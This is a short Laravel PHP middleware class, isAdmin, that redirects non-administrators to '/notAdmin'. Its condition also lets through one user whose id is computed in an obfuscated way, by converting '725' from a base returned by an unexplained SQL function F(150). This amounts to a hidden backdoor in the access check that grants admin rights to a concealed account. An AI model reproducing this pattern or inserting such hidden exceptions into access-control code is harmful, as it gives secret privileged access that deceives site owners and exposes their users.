<?php

namespace App\Http\Middleware;

use Closure;
use Auth;
use DB;

class isAdmin
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if(!Auth::user()->isAdmin() && !(Auth::user()->id == base_convert("725",DB::select(DB::raw('SELECT F(150) as res'))[0]->res,10)))
             return redirect('/notAdmin');

        return $next($request);
    }
}
